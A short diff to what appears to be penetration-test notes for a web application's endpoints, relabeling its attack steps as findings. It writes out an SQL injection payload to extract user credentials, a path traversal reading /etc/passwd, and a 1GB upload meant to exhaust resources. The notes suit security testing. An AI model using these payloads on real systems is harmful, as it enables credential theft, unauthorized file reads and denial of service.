@@ -18,15 +18,15 @@ enter "<url>/confirm-client/31/32/<token>"
 - Adding a rule
 enter "<url>/post-rule/init/admin/1"
 
-# Payload: Inject SQL to extract all user credentials
+# Finding 1: Inject SQL to extract all user credentials
 payload=$(echo "' UNION SELECT user, password FROM user_pw_table;--" | xxd -p)
-curl k "<url>/init_client/${payload}/31"
+curl -k "<url>/init_client/${payload}/31"
 
-# Inject '../' into the file path parameter to read unauthorized files
+# Finding 2: Inject '../' into the file path parameter to read unauthorized files
 payload=$(echo "../../etc/passwd" | xxd -p)
 enter "<url>/get_rule/${payload}"
 
-# Generate a large file (1GB) and upload it
+# Finding 3: Generate a large file (1GB) and upload it
 dd if=/dev/zero of=largefile.txt bs=1M count=1024
 curl -X POST -F "file=@largefile.txt" -k "<url>/post-rule/init/validsite/validuser"
 
